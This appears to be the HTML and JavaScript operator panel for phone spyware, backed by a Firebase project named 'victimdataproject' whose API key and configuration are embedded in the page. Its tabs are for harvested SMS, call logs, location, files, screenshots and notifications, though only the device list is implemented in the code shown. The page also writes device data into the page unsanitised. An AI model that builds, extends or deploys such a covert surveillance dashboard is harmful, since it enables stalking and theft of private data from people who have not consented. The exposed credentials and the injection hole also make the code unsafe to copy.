<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Panel - Device Monitor</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    body { background-color: #f8f9fa; }
    .nav-link { cursor: pointer; }
    .tab-pane { padding-top: 20px; }
  </style>
</head>
<body>
  <div class="container py-4" id="loginPanel">
    <h3 class="text-center mb-4">Admin Login</h3>
    <div class="card p-4 shadow-sm">
      <input type="email" class="form-control mb-2" id="email" placeholder="Email">
      <input type="password" class="form-control mb-3" id="password" placeholder="Password">
      <button class="btn btn-primary w-100" onclick="login()">Login</button>
    </div>
  </div>  <div class="container-fluid d-none" id="dashboard">
    <div class="d-flex justify-content-between align-items-center p-3 bg-white shadow-sm">
      <h4 class="mb-0">ðŸ“Š Admin Dashboard</h4>
      <button class="btn btn-outline-danger btn-sm" onclick="logout()">Logout</button>
    </div><ul class="nav nav-tabs mt-3" id="adminTabs">
  <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" data-bs-target="#devices">Devices</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#sms">SMS Logs</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#calls">Call Logs</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#apps">Installed Apps</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#battery">Battery</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#location">Location</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#files">Files</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#screenshots">Screenshots</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#notifications">Notifications</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" data-bs-target="#deviceinfo">Device Info</a></li>
</ul>

<div class="tab-content p-3">
  <div class="tab-pane fade show active" id="devices"><div id="deviceCards" class="row"></div></div>
  <div class="tab-pane fade" id="sms"><div id="smsLogs">Loading SMS...</div></div>
  <div class="tab-pane fade" id="calls"><div id="callLogs">Loading Calls...</div></div>
  <div class="tab-pane fade" id="apps"><div id="appsList">Loading Apps...</div></div>
  <div class="tab-pane fade" id="battery"><div id="batteryInfo">Loading Battery Info...</div></div>
  <div class="tab-pane fade" id="location"><div id="gpsLocation">Loading Location...</div></div>
  <div class="tab-pane fade" id="files"><div id="fileLogs">Loading Files...</div></div>
  <div class="tab-pane fade" id="screenshots"><div id="screens">Loading Screenshots...</div></div>
  <div class="tab-pane fade" id="notifications"><div id="notificationsTab">Loading Notifications...</div></div>
  <div class="tab-pane fade" id="deviceinfo"><div id="deviceInfo">Loading Device Info...</div></div>
</div>

  </div>  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
      authDomain: "victimdataproject.firebaseapp.com",
      databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
      projectId: "victimdataproject",
      storageBucket: "victimdataproject.firebasestorage.app",
      messagingSenderId: "938788267301",
      appId: "1:938788267301:web:cdcff391160dce48fa66cc"
    };

    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.database();

    function login() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      auth.signInWithEmailAndPassword(email, password)
        .then(() => {
          document.getElementById('loginPanel').classList.add('d-none');
          document.getElementById('dashboard').classList.remove('d-none');
          loadAllData();
        })
        .catch(err => alert('Login failed: ' + err.message));
    }

    function logout() {
      auth.signOut().then(() => location.reload());
    }

    function loadAllData() {
      const ref = db.ref('devices');
      ref.on('value', snapshot => {
        const devices = snapshot.val();
        const deviceCards = document.getElementById('deviceCards');
        deviceCards.innerHTML = '';
        for (let uid in devices) {
          const d = devices[uid];
          const card = document.createElement('div');
          card.className = 'col-md-4';
          card.innerHTML = `
            <div class="card mb-3 shadow-sm">
              <div class="card-body">
                <h5 class="card-title">${d.alias || uid}</h5>
                <p class="card-text">
                  <b>Battery:</b> ${d.battery?.level || 'N/A'}%<br>
                  <b>Status:</b> ${d.status || 'Unknown'}<br>
                  <b>Last Seen:</b> ${new Date(d.last_seen || 0).toLocaleString()}
                </p>
              </div>
            </div>
          `;
          deviceCards.appendChild(card);
        }
      });
    }

    auth.onAuthStateChanged(user => {
      if (user) {
        document.getElementById('loginPanel').classList.add('d-none');
        document.getElementById('dashboard').classList.remove('d-none');
        loadAllData();
      }
    });
  </script></body>
</html>